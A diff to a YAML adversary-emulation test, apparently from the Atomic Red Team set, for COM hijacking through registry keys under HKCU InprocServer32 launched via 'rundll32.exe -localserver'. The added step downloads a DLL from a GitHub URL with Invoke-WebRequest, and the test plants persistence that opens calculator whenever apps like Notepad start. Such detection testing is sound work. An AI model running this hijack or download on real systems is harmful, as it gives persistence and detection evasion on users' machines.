@@ -2,6 +2,9 @@ api_version: "2.0"
 name: COM Hijacking with RunDLL32 (Local Server Switch)
 description: "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. "
 args:
+    - name: clsid_threading
+      type: string
+      default: Both
     - name: dll_path
       type: string
       default: PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll
@@ -11,9 +14,6 @@ args:
     - name: clsid_description
       type: string
       default: MSAA AccPropServices
-    - name: clsid_threading
-      type: string
-      default: Both
 uuid: 123520cc-e998-471b-a920-bd28e3feafa0
 mitre:
     tactics:
@@ -27,6 +27,12 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: DLL For testing
+      inline: |-
+        if (Test-Path "#{dll_path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
+        }}
+      executor: powershell
     - name: com-hijacking-with-rundll32-(local-server-switch)
       inline: |-
         New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{{.Args.clsid}}' -Value '{{.Args.clsid_description}}'
